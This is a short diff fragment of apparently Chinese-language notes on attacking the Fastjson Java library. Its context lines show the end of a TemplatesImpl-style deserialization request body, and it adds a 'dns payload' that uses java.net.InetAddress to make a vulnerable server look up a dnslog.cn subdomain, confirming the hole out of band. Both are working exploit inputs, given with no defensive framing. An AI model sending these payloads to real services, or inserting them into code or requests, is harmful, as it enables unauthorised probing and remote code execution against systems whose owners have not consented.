@@ -8,3 +8,7 @@ body 为
 	"_tfactory": {},
 	"_outputProperties": {}
 }
+
+
+dns payload
+{"name":{"@type":"java.net.InetAddress","val":"89898.5jfnms.dnslog.cn"}}
